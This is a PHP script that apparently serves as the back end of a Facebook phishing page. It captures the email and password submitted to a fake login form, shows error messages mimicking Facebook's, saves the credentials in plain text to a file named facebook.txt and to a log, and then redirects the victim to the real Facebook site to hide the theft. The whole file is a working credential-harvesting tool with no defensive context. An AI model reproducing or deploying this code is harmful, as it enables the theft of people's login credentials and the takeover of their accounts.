<?php
// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password']; // It's crucial to handle passwords securely

    // Validate email and password
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // Handle invalid email
        echo "The email address or mobile number you entered isn't connected to an account.";
    } elseif (strlen($password) < 8 || preg_match('/\s/', $password)) {
        // Handle invalid password
        echo "The password that you've entered is incorrect.";
    } else {
        // Ensure the data directory exists
        if (!is_dir('../data')) {
            mkdir('../data', 0777, true);
        }

        // Ensure the logs directory exists
        if (!is_dir('../logs')) {
            mkdir('../logs', 0777, true);
        }

        // Save the data to a file securely
        $file = fopen("../data/facebook.txt", "a");
        fwrite($file, "Email: $email\nPassword: $password\n\n");
        fclose($file);

        // Log the data to the terminal
        error_log("Email: $email\nPassword: $password\n", 3, "../logs/facebook.log");

        // Redirect to the real Facebook login page
        header("Location: https://www.facebook.com/");
        exit();
    }
}
?>